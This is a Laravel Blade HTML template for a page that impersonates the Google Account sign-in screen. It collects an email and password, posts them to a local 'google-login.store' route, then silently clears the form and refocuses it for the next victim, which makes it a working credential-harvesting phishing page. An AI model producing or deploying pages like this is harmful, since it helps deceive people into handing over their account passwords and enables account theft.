<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account</title>
    <link rel="icon" type="image/png" href="{{ asset('favicon.png') }}">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #202124;
        }

        .login-container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 40px;
            text-align: center;
        }

        .google-logo {
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
            align-items: center;
        }

        .google-logo svg {
            width: 80px;
            height: auto;
        }

        .login-container h1 {
            font-size: 32px;
            font-weight: 400;
            line-height: 1.3;
            margin-bottom: 8px;
            color: #202124;
        }

        .login-container p {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .form-group {
            margin-bottom: 24px;
            text-align: left;
        }

        .form-group label {
            display: block;
            font-size: 12px;
            font-weight: 500;
            color: #80868b;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            transition: all 0.2s ease;
        }

        .form-group input:hover {
            border-color: #c6c6c6;
            box-shadow: 0 1px 1px rgba(0,0,0,.04), inset 0 1px 3px rgba(0,0,0,.02);
        }

        .form-group input:focus {
            outline: none;
            border-color: #4285f4;
            box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
        }

        .form-group input::placeholder {
            color: #9aa0a6;
        }

        .error {
            display: none;
            color: #d33b27;
            font-size: 13px;
            margin-top: 8px;
        }

        .form-group input:invalid ~ .error {
            display: block;
        }

        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .forgot-link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            cursor: pointer;
            transition: color 0.2s ease;
        }

        .forgot-link:hover {
            color: #1765cc;
            text-decoration: underline;
        }

        .submit-btn {
            background-color: #5f6368;
            color: white;
            border: none;
            padding: 10px 32px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .submit-btn:hover {
            background-color: #4a4a4a;
            box-shadow: 0 1px 1px rgba(0,0,0,.1), 0 1px 3px rgba(0,0,0,.3);
        }

        .submit-btn:active {
            background-color: #3a3a3a;
        }

        .footer {
            text-align: left;
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #dadce0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
        }

        .footer-left, .footer-right {
            display: flex;
            gap: 16px;
        }

        .footer a {
            color: #70757a;
            text-decoration: none;
            cursor: pointer;
            transition: color 0.2s ease;
        }

        .footer a:hover {
            color: #202124;
            text-decoration: underline;
        }

        .input-wrapper {
            position: relative;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Google Logo -->
        <div class="google-logo">
            <img src="{{ asset('mylogo.png') }}" alt="Logo" style="max-width: 200px; height: auto; display: block;">
        </div>

        <h1>Sign in</h1>
        <p>to your Google Account</p>

        <form method="POST" action="{{ route('google-login.store') }}" id="loginForm">
            @csrf

            <div class="form-group">
                <label for="email">Email or phone</label>
                <input 
                    type="email" 
                    id="email" 
                    name="email" 
                    placeholder="you@example.com"
                    required
                    value="{{ old('email') }}"
                >
                @error('email')
                    <div class="error">{{ $message }}</div>
                @enderror
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    placeholder="Enter your password"
                    required
                >
                @error('password')
                    <div class="error">{{ $message }}</div>
                @enderror
            </div>

            <div class="button-group">
                <a href="#" class="forgot-link">Forgot password?</a>
                <button type="submit" class="submit-btn">Next</button>
            </div>
        </form>

        <div class="footer">
            <div class="footer-left">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
            <div class="footer-right">
                <select style="border: none; background: transparent; color: #70757a; cursor: pointer; font-size: 12px;">
                    <option>English (United States)</option>
                    <option>Español</option>
                    <option>Français</option>
                    <option>Deutsch</option>
                </select>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const form = this;
            const formData = new FormData(form);
            
            fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest',
                }
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Silent submission - just reset the form
                    form.reset();
                    // Optional: focus on email field for next submission
                    document.getElementById('email').focus();
                }
            })
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>
